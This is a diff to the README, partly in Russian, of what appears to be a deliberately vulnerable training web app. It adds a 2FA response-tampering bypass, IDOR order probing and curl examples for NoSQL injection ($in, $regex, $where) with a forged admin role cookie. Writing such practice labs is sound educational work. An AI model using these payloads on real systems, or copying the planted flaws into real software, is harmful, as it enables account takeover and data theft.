@@ -56,6 +56,7 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 - Default credentials: `alice/dancercHick2000`
 - Vulnerable password reset: токен предсказуем
 - HTTP Verb tampering: `PUT /auth/login`
+- 2FA response tampering bypass: `POST /auth/2fa` может вернуть `401` с уже активированной сессией (если перехватить и подменить статус на `200`, защищённая страница отображается как будто 2FA пройдена)
 - IDOR: `GET /orders/<id>`
 - Privilege escalation: роль берётся из cookie `role` (base64), можно поднять права подменой `dXNlcg==` (`user`) -> `YWRtaW4=` (`admin`)
 
@@ -101,6 +102,7 @@ curl "http://localhost:8000/product/1/reviews/moderation?rating={\"$in\":[4,5]}&
 # $regex: поиск по тексту отзыва
 curl "http://localhost:8000/product/1/reviews/moderation?text={\"$regex\":\".*great.*\",\"$options\":\"i\"}&status=all" \
   -b "role=YWRtaW4="
+```
 
 # $where: top-level JavaScript выражение в запросе отзывов
 curl "http://localhost:8000/product/1/reviews/moderation?author={\"$where\":\"this.rating>=4\"}&status=all" \
@@ -115,6 +117,7 @@ curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
   --data-urlencode 'card_number=4111-1111-1111-1111' \
   --data-urlencode 'status=all' \
   -b "role=YWRtaW4="
+```
 
 # operator-based вариант (если нужен для демонстрации NoSQLi)
 curl -X POST "http://localhost:8000/product/1/reviews/moderation" \
@@ -176,6 +179,10 @@ curl -X PUT "http://localhost:8000/auth/login?username=alice"
 
 **IDOR (`/orders/<id>`):**
 ```bash
+# Dashboard сам после загрузки делает запросы:
+# GET /account/orders/ids -> далее GET /orders/<id> для каждого id
+# После этого можно руками перебирать id на /account/dashboard (IDOR order probe).
+
 curl "http://localhost:8000/orders/1"
 curl "http://localhost:8000/orders/2"
 ```
